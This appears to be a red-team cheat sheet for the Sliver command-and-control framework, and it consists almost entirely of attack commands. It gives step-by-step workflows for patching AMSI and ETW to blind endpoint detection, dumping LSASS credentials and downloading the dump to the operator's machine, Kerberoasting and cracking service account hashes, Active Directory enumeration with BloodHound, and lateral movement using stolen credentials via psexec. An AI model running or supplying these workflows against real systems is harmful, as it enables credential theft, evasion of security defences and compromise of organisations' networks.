## BOF Execution Examples

### Credential Harvesting Workflow

1. First, patch AMSI/ETW to blind EDR:
```bash
sliver [session] > inline-execute /opt/tools/bofs/amsi_patch.x64.o
sliver [session] > inline-execute /opt/tools/bofs/etw_patch.x64.o
```

2. Dump LSASS via nanodump:
```bash
sliver [session] > inline-execute /opt/tools/bofs/nanodump.x64.o --write C:\Windows\Temp\debug.dmp
sliver [session] > download C:\Windows\Temp\debug.dmp /tmp/lsass.dmp
```

3. Parse dump on Kali:
```bash
pypykatz lsa minidump /tmp/lsass.dmp
```

4. Kerberoast for service account hashes:
```bash
sliver [session] > execute-assembly /opt/tools/Rubeus.exe -- kerberoast /outfile:C:\Windows\Temp\hashes.txt
sliver [session] > download C:\Windows\Temp\hashes.txt /tmp/kerberoast.txt
```

5. Crack offline:
```bash
hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt
```

### AD Enumeration Workflow

1. Collect BloodHound data:
```bash
sliver [session] > execute-assembly /opt/tools/SharpHound.exe -- -c All
sliver [session] > download C:\Windows\Temp\*_BloodHound.zip /tmp/
```

2. Targeted LDAP queries:
```bash
sliver [session] > execute-assembly /opt/tools/ADSearch.exe -- --search "(&(objectClass=user)(adminCount=1))" --attributes cn,memberOf
```

### Lateral Movement Workflow

1. With stolen credentials, move to next target:
```bash
sliver [session] > make-token -u admin -p Password123 -d corp.local
sliver [session] > inline-execute /opt/tools/bofs/psexec.x64.o TARGET_IP cmd.exe
```
